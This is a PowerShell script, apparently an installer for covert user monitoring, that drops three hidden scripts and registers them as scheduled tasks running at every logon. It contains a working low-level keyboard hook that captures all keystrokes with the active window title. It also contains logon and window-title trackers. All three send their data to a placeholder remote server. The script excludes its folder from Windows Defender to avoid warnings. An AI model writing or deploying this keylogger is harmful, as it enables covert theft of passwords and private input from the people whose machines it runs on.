$CollectionServer = "http://YOUR_SERVER_IP:8080/"

$LogonScript = @'
$sessionId = [System.Diagnostics.Process]::GetCurrentProcess().SessionId

# RDP source IP — empty on console sessions
$rdpClientIp = $null
try {
    $rdpClientIp = (Get-WmiObject -Namespace root\cimv2\TerminalServices `
                        -Class Win32_TSSessionSetting `
                        -Filter "SessionID=$sessionId").ClientIPAddress
} catch {}

# AD groups — gracefully skipped if not domain-joined
$adGroups = $null
try {
    $adProps  = ([adsisearcher]"(samaccountname=$env:USERNAME)").FindOne().Properties
    $adGroups = ($adProps.memberof | ForEach-Object {
                    ($_ -split ',')[0] -replace 'CN=', ''
                }) -join "; "
} catch {}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

$body = @{
    event_type      = "logon"
    username        = $env:USERNAME
    hostname        = $env:COMPUTERNAME
    domain          = $env:USERDOMAIN
    logon_server    = $env:LOGONSERVER
    timestamp       = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    session_type    = if ($env:SESSIONNAME -like "RDP*") { "RDP" } else { "Console" }
    session_id      = $sessionId
    rdp_client_name = $env:CLIENTNAME
    rdp_client_ip   = $rdpClientIp
    is_admin        = $isAdmin
    ad_groups       = $adGroups
} | ConvertTo-Json

try {
    Invoke-WebRequest -Uri "http://YOUR_SERVER_IP:8080/" `
                      -Method POST `
                      -ContentType "application/json" `
                      -Body $body `
                      -UseBasicParsing | Out-Null
} catch {}
'@

$WindowMonitor = @'
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class WinAPI {
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder s, int n);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
}
"@

$server    = "http://YOUR_SERVER_IP:8080/"
$lastTitle = ""

while ($true) {
    Start-Sleep -Seconds 5

    $hwnd = [WinAPI]::GetForegroundWindow()
    $sb   = New-Object System.Text.StringBuilder 512
    [WinAPI]::GetWindowText($hwnd, $sb, 512) | Out-Null
    $title = $sb.ToString().Trim()

    if ($title -and $title -ne $lastTitle) {
        $procId  = [uint32]0
        [WinAPI]::GetWindowThreadProcessId($hwnd, [ref]$procId) | Out-Null
        $process = (Get-Process -Id $procId -ErrorAction SilentlyContinue).ProcessName

        $body = @{
            event_type   = "window_change"
            username     = $env:USERNAME
            hostname     = $env:COMPUTERNAME
            timestamp    = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            window_title = $title
            process      = $process
        } | ConvertTo-Json

        try {
            Invoke-WebRequest -Uri $server -Method POST -ContentType "application/json" `
                              -Body $body -UseBasicParsing | Out-Null
        } catch {}

        $lastTitle = $title
    }
}
'@

$KeyboardMonitor = @'
Add-Type -TypeDefinition @"
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;

public class KeyboardMonitor {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN     = 0x0100;
    private const int WM_SYSKEYDOWN  = 0x0104;

    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc cb, IntPtr hmod, uint threadId);
    [DllImport("user32.dll")] private static extern bool   UnhookWindowsHookEx(IntPtr hk);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hk, int code, IntPtr wp, IntPtr lp);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);
    [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] private static extern int    GetWindowText(IntPtr hWnd, StringBuilder s, int n);
    [DllImport("user32.dll")] private static extern bool   GetKeyboardState(byte[] ks);
    [DllImport("user32.dll")] private static extern int    ToUnicode(uint vk, uint sc, byte[] ks, StringBuilder sb, int size, uint flags);

    private delegate IntPtr LowLevelKeyboardProc(int code, IntPtr wParam, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT { public uint vkCode, scanCode, flags, time; public IntPtr dwExtraInfo; }

    private static IntPtr hookId = IntPtr.Zero;
    private static LowLevelKeyboardProc proc;
    private static readonly StringBuilder buffer  = new StringBuilder();
    private static readonly object        bufLock = new object();
    private static string serverUrl, username, hostname;

    public static void Start(string url, string user, string host) {
        serverUrl = url;
        username  = user;
        hostname  = host;

        var timer = new Timer(3000) { AutoReset = true };
        timer.Elapsed += (s, e) => Flush();
        timer.Start();

        proc   = HookCallback;
        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
        Application.Run();
    }

    private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
        if (code >= 0 && ((int)wParam == WM_KEYDOWN || (int)wParam == WM_SYSKEYDOWN)) {
            var ks = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
            lock (bufLock) { buffer.Append(TranslateKey((int)ks.vkCode, ks.scanCode)); }
        }
        return CallNextHookEx(hookId, code, wParam, lParam);
    }

    private static string TranslateKey(int vk, uint sc) {
        switch (vk) {
            case 8:  return "[BACK]";
            case 9:  return "[TAB]";
            case 13: return "[ENTER]\n";
            case 27: return "[ESC]";
            case 32: return " ";
            case 37: return "[LEFT]";
            case 38: return "[UP]";
            case 39: return "[RIGHT]";
            case 40: return "[DOWN]";
            case 46: return "[DEL]";
        }
        byte[] keyState = new byte[256];
        GetKeyboardState(keyState);
        var sb     = new StringBuilder(4);
        int result = ToUnicode((uint)vk, sc, keyState, sb, sb.Capacity, 0);
        if (result >= 1) return sb.ToString(0, result);
        if (result == -1) {
            // Dead key — call again to restore keyboard state, then discard
            ToUnicode((uint)vk, sc, keyState, sb, sb.Capacity, 0);
            return "";
        }
        string name = ((Keys)vk).ToString();
        return name.Length > 1 ? "[" + name + "]" : name;
    }

    private static string ActiveWindow() {
        var sb = new StringBuilder(512);
        GetWindowText(GetForegroundWindow(), sb, 512);
        return sb.ToString().Trim();
    }

    private static string Escape(string s) {
        return s.Replace("\\", "\\\\").Replace("\"", "\\\"")
                .Replace("\n", "\\n").Replace("\r", "\\r").Replace("\t", "\\t");
    }

    private static void Flush() {
        string chunk;
        lock (bufLock) {
            if (buffer.Length == 0) return;
            chunk = buffer.ToString();
            buffer.Clear();
        }
        string json = string.Format(
            "{{\"event_type\":\"keystrokes\",\"username\":\"{0}\",\"hostname\":\"{1}\"," +
            "\"timestamp\":\"{2}\",\"window\":\"{3}\",\"keystrokes\":\"{4}\"}}",
            Escape(username), Escape(hostname),
            DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
            Escape(ActiveWindow()), Escape(chunk));
        try {
            using (var client = new WebClient()) {
                client.Headers[HttpRequestHeader.ContentType] = "application/json";
                client.UploadString(serverUrl, json);
            }
        } catch {}
    }
}
"@ -ReferencedAssemblies "System.Windows.Forms"

[KeyboardMonitor]::Start("http://YOUR_SERVER_IP:8080/", $env:USERNAME, $env:COMPUTERNAME)
'@

New-Item -ItemType Directory -Path "C:\temp" -Force | Out-Null

# Exclude C:\temp from Defender before writing scripts — silent, no tray warnings
Add-MpPreference -ExclusionPath "C:\temp"

$LogonScript.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer)     | Set-Content -Path "C:\temp\script.ps1"           -Encoding UTF8
$WindowMonitor.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer)   | Set-Content -Path "C:\temp\window_monitor.ps1"   -Encoding UTF8
$KeyboardMonitor.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer) | Set-Content -Path "C:\temp\keyboard_monitor.ps1"  -Encoding UTF8

# Task 1: logon notification — runs as the logged-on user so env vars reflect the actual user
Register-ScheduledTask `
    -TaskName  "LogonNotify" `
    -Action    (New-ScheduledTaskAction -Execute "powershell.exe" `
                    -Argument "-NonInteractive -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\temp\script.ps1`"") `
    -Trigger   (New-ScheduledTaskTrigger -AtLogon) `
    -Principal (New-ScheduledTaskPrincipal -GroupId "S-1-5-4" -RunLevel Limited) `
    -Force

# Task 2: window monitor — per-session, runs as the logged-on user
Register-ScheduledTask `
    -TaskName  "WindowMonitor" `
    -Action    (New-ScheduledTaskAction -Execute "powershell.exe" `
                    -Argument "-NonInteractive -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\temp\window_monitor.ps1`"") `
    -Trigger   (New-ScheduledTaskTrigger -AtLogon) `
    -Principal (New-ScheduledTaskPrincipal -GroupId "S-1-5-4" -RunLevel Limited) `
    -Force

# Task 3: keyboard monitor — per-session, runs as the logged-on user
Register-ScheduledTask `
    -TaskName  "KeyboardMonitor" `
    -Action    (New-ScheduledTaskAction -Execute "powershell.exe" `
                    -Argument "-NonInteractive -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\temp\keyboard_monitor.ps1`"") `
    -Trigger   (New-ScheduledTaskTrigger -AtLogon) `
    -Principal (New-ScheduledTaskPrincipal -GroupId "S-1-5-4" -RunLevel Limited) `
    -Force
